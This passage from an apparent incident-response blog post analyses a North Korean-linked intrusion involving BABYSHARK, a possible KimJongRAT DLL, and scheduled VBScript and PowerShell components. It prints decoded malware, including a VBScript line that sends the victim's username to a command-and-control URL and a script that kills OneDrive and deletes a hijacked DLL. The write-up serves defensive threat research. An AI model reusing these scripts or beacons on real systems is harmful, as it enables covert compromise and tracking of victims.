https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2"/></picture></div></figure><p><br/></p><p>desktop.r5u and <span class="highlight">desktop.xml</span> decode to a RAT.</p><p>Looking at the first few characters (<span class="highlight"><strong>]TVqQAA</strong></span>) we can see that this is probably a base64 encoded PE file.  Indeed, using CyberChef, we can decode the base64 text to obtain a DLL file. </p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1532px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1532px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a"/></picture></div></figure><p>Loading the DLL in <span class="highlight">pestudio</span> reveals a pdb path that leaves nothing to the imagination: “<span class="highlight">H:\Hollow\googleDrive_rat_load_complete\rat_load\Release\rat_load.pdb</span>”</p><p>It’s worth noting that this file cannot be found in VirusTotal. While we have not yet finished our analysis on this DLL, it is not a stretch to consider this could be <a href="https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/" target="_blank">a variant of the KimJongRAT known to be often used alongside BABYSHARK</a>.</p><p>The <span class="highlight">desktop.xml</span> file seems to copy itself to (or possibly check for) <span class="highlight">desktop.r5u</span> file in <span class="highlight">%appdata\roaming\Microsoft%</span> directory as this can be found hardcoded in the binary.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:639px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="639px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232"/></picture></div></figure><p>It also contains references to the following DLLs within an embedded PE file:</p><figure class="w-richtext-figure-type-image w-richtext-align-center" data-rt-type="image" data-rt-align="center"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613"/></picture></div></figure><p>The exports from this binary are as follows: </p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1210px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1210px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65"/></picture></div></figure><p>If there weren’t already enough moving pieces to this story, we uncovered even more activity through <span class="highlight">wscript.exe</span> with our Process Insights capability. Alongside the running scheduled tasks, there was an occurrence of a script CF8C.vbs being run out of Alex&#x27;s temporary directory. </p><p><span class="highlight">wscript.exe C:\Users\Alex\AppData\Local\Temp\CF8C.vbs <em>[MoreVBScript]</em></span></p><p>This <span class="highlight">CF8C.vbs</span> file was no longer present on the host, but considering it had practically the contents of another script passed as another argument, it was clear it would again deobfuscate or substitute symbols and execute more VBScript.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1089px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1089px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e"/></picture></div></figure><p><a href="https://gist.github.com/JohnHammond/b450d9efe00c80bbe85b3a05d72d74f3" target="_blank">This deobfuscated VBScript</a> reaches out to a OneDrive link, a tactic once again referenced in other public research, then deobfuscates and executes the supplied VBScript.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1078px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1078px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac"/></picture></div></figure><p><a href="https://gist.github.com/JohnHammond/6f55e4d18951f941e11a172a1db40971" target="_blank">This decodes to...</a></p><p><span class="highlight">On Error Resume Next:Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set ws=CreateObject(&quot;WScript.Shell&quot;):Set p0 = CreateObject(&quot;msxml2.xmlhttp&quot;):scriptdir = ws.ExpandEnvironmentStrings(&quot;%appdata%&quot;):userdir = ws.ExpandEnvironmentStrings(&quot;%userprofile%&quot;):username = lcase(ws.ExpandEnvironmentStrings(&quot;%username%&quot;)):username=Escape(username):username=Replace(username,&quot;%u&quot;,&quot;&quot;):chk=&quot;no&quot;:username=lcase(username):p0.open &quot;GET&quot;, &quot;https://frebough.com/onedrive/winmm.php?op=&quot; +username,false:p0.setRequestHeader &quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;:p0.Send</span></p><p>Presumably, this is to tell yet another C2 server that this step is completed. It does not seem to execute more code from the response.</p><h2>Additional Artifacts</h2><p>Alongside the <span class="highlight">qwert.vbs</span> file we found on Alex’s host, we uncovered multiple other strange files.</p><p><span class="highlight">r.vbs</span> seemed to kill the <span class="highlight">OneDrive.exe </span>process, wait three seconds, and remove a <span class="highlight">version.dll</span> file present in the same directory as the OneDrive executable. Then, five seconds later, it runs the <span class="highlight">OneDrive.exe</span> process once more.</p><p><span class="highlight">On Error Resume Next<br/>Set wShell=CreateObject(&quot;WScript.Shell&quot;)<br/>retu=wShell.run(&quot;cmd.exe /c taskkill /im onedrive.exe /f &amp; timeout 3&amp; del &quot;&quot;%userprofile%\AppData\Local\Microsoft\OneDrive\version.dll&quot;&quot;&quot;,0,true)<br/>retu=wShell.run(&quot;cmd.exe /c timeout 5&quot;,0,true)<br/>retu=wShell.run(&quot;&quot;&quot;%userprofile%\AppData\Local\Microsoft\OneDrive\onedrive.exe&quot;&quot; /background&quot;,0,false)</span></p><p>Unfortunately we were unable to find the <span class="highlight">version.dll</span> file on Alex&#x27;s host or any other affected machines. Considering the file placement, this looks to be a <a href="https://packetstormsecurity.com/files/158380/Microsoft-OneDrive-19.232.1124.0010-DLL-Hijacking.html#:~:text=A%20file%20hijacking%20vulnerability%20was,the%20privileges%20of%20the%20victim." target="_blank">known DLL hijacking technique</a> to run additional code.</p><p>Considering this script removes the <span class="highlight">version.dll</span> file, once again runs OneDrive with normal execution, and the slight filename “r.vbs” perhaps this is a mechanism to “remove” another implant. We later discovered this same code on Bob’s machine under the filename 1.vbs.</p><p>Additionally, a <a href="https://gist.github.com/JohnHammond/d017e8d3f83093f48bb7188fefa79b00" target="_blank">dev.ps1 file was found</a> on the affected host. This used inline C# code within PowerShell to seemingly track Google Chrome and Microsoft Edge tabs, monitor the use of Browser Developer Tools and log these to a <span class="highlight">tabid_chrome.log, tabid_edge.log</span> and a <span class="highlight">living.log</span> file that was updated the current date and time. These log files contained nothing more than an identification number for each tab, but we could see from the <span class="highlight">living.log</span> file that this code was <em>actively</em> running on the victim.</p><p>(We later discovered <span class="highlight"><a href="https://gist.github.com/JohnHammond/4b356fe54d57e0be513b71ebdeca3895" target="_blank">dev.vbs</a></span><a href="https://gist.github.com/JohnHammond/4b356fe54d57e0be513b71ebdeca3895" target="_blank"> on Bob’s machine</a> which looks to kickstart the <span class="highlight">dev.ps1</span> file—also present with the same contents under the filename <span class="highlight">onenote.vbs</span>.)</p><p>On a separate user’s machine (we will call them Charlie for the sake of storytelling) we discovered the <span class="highlight">onenote.vbs</span> file with <a href="https://gist.github.com/JohnHammond/24cd52c14a50c5f48437931e3bfe973e" target="_blank">slightly different contents</a> to invoke the PowerShell script with a different technique, as well as <a href="https://gist.github.com/JohnHammond/4f4bcb04743fa5c911066084182a47cd" target="_blank">a new <span class="highlight">pow.ps1</span></a> that looked to remove Google Chrome security preferences.</p><h2>Putting the Puzzle Pieces Together</h2><p>While we continued to do analysis on the files and threads we uncovered, we knew we were slowly building the big picture of this attack chain. Considering how BABYSHARK malware would traditionally be run, we knew we were still missing one critical piece of information: the initial access where this all started from. <strong>Where was the phish?</strong></p><p>The first step in finding initial access was to figure out the timeframe of the compromise. To do that, we searched for other interesting files on the machines. The earliest found script file was the <span class="highlight">sys0.vbs</span> script we found earlier. The timestamps for this file placed our timeline starting on March 9, 2021. This helped us narrow down the timeframe from when the malicious document(s) may have been downloaded.</p><p>The APT group is known to use spear phishing emails with malicious links embedded or malicious documents attached to gain access, so we started hunting for them on the system. Being extremely cautious of what we could dig through, we examined only suspicious Microsoft Office during the early months of 2021. </p><p>Unfortunately, we couldn’t find a smoking gun. But at that time, only Alex&#x27;s computer was online and communicating with Huntress.</p><p>As we communicated with this trialing partner, explaining what we uncovered and the gravity of this incident, they notified the players involved. Soon enough, the other compromised machines (Bob&#x27;s and Charlie&#x27;s, specifically) came online.</p><p>With those hosts now accessible to Huntress, we could correlate what files were present across <em>all</em> of these compromised machines. While the AV product the organization was using did not <em>stop</em> the intrusion, it at the very least had <em>logs</em> of what files were scanned and when.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1200px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1200px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477"/></picture></div></figure><p>Using the logs across all three hosts, we uncovered only a handful of files that were present on each host. The most interesting file that stuck out to us was <span class="highlight">VOA_Korea.zip</span>. From the logs, we could tell it had a <span class="highlight"><strong>.</strong>doc </span>file inside of it, and this seemed promising. We also noticed that the scanning of the ZIP file and its contents failed. This could be indicative of password protection.</p><p>If you hadn’t caught on to the acronym, the VOA in this case refers to the Voice of America media organization. Voice of America is an international broadcasting station in the United States, focusing on offering information and news from 